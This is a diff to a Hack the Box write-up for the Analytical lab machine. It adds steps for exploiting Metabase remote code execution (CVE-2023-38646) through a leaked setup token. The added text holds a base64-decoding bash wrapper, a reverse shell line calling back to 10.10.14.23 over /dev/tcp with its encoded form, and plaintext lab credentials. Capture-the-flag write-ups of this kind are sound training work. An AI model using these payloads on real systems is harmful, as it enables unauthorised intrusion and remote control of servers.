@@ -134,5 +134,35 @@ TCP 80 - HTTP
 http://data.analytical.htb/auth/login?redirect=%2F
 ```
 ![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/b2c852d7-68d7-4fa9-ae80-2f23bdd66dc6)
+![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/5514d41e-fcac-4f3c-a712-ab91a93c47f7)
 
+Metabase - Remote Code Execution (CVE-2023-38646)
+Session Token Leaked
+![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/b701daa7-c72c-4670-b417-eb345356740a)
 
+Test Command Execution
+```shell
+python -m http.server 80
+```
+![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/91e7bbec-50db-44d8-97e7-7b27835991be)
+![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/470a709c-3a69-4aa9-9868-ab9bd8b6c6a7)
+
+Reverse Shell Payload
+```shell
+bash -c {echo,{payload}|{base64,-d}|{bash,-i}
+```
+
+Shell Base64 encoded
+```shell
+> echo "sh -i >& /dev/tcp/10.10.14.23/1337 0>&1" | base64
+c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMjMvMTMzNyAwPiYxCg==
+```
+
+![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/74ceef41-77e9-4af1-aea1-7fdbe072dcc7)
+![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/0ed2a2c7-e3eb-43f1-afd2-edbbcee86ddb)
+![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/9336028c-c5ce-4dd0-a10b-b684258108ef)
+![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/fb9de20d-edbd-4769-9a1c-3abbf94fc677)
+
+```shell
+creds: metalytics:An4lytics_ds20223#
+```
